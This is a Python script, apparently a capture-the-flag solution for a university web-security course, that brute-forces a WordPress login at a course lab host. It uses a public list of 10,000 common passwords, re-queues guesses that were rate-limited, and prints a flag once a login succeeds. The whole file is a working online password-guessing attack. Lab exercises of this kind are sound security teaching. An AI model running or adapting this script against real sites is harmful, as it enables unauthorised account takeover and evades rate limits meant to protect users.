import requests
import os
import re

session = requests.Session()
session.cert = os.path.join(os.path.dirname(__file__), "../../z5437741.pem")

BASE_URL = "https://blog.quoccacorp.com"
WP_LOGIN_URL = f"{BASE_URL}/wp-login.php"
USERNAME = "Ihaveabadpassword"
COMMON_PASSWORDS_URL = "https://github.com/danielmiessler/SecLists/raw/refs/heads/master/Passwords/Common-Credentials/10k-most-common.txt"
INCORRECT_PASSWORD_MSG = f"The password you entered for the username <strong>{USERNAME}</strong> is incorrect."
FLAG_PAGE_URL = f"{BASE_URL}/?p=26"
FLAG_PATTERN = r"(COMP6443{.+?})"

def find_flag(text: str):
    if flag_match := re.search(FLAG_PATTERN, text):
        flag = flag_match.group(1)
        print(f"\n🚩 FLAG FOUND 🚩\n{flag}" * 10)
        exit()

def get_common_passwords(common_passwords_url = COMMON_PASSWORDS_URL) -> list[str]:
    return session.get(common_passwords_url).content.decode("utf-8", "ignore").splitlines()

def main():
    passwords = get_common_passwords()
    passwords.reverse()
    while passwords:
        password = passwords.pop()
        print(f"🔐 Trying {password = }")

        response = session.post(WP_LOGIN_URL, data={"log": USERNAME, "pwd": password, "rememberme": "forever"})
        response_text = response.content.decode("utf-8", "ignore")

        if INCORRECT_PASSWORD_MSG not in response_text and response.status_code != 429:
            print(f"🔓 PASSWORD FOUND: {password}")
            response = session.get(FLAG_PAGE_URL)
            response_text = response.content.decode("utf-8", "ignore")
            find_flag(response_text)
            break

        if response.status_code == 429:
            passwords.append(password)

if __name__ == "__main__":
    main()